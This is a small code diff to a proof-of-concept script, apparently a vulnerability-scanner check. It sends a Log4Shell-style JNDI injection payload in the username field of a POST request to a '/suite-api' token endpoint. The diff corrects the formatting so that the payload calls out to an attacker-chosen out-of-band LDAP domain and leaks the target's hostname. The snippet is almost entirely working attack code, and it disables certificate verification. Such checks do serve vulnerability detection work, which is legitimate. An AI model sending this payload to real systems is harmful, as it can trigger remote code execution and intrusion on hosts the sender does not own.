@@ -41,7 +41,7 @@ def poc(url):
 
         path = """/suite-api/api/auth/token/acquire"""
         method = "POST"
-        data = """{"username":"${jndi:ldap://${hostName}.oob_domain}","password":"admin"}"""
+        data = """{"username":"${jndi:ldap://${hostName}.%s}","password":"admin"}""" % oob_domain
         headers = {'Content-Type': 'application/json'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
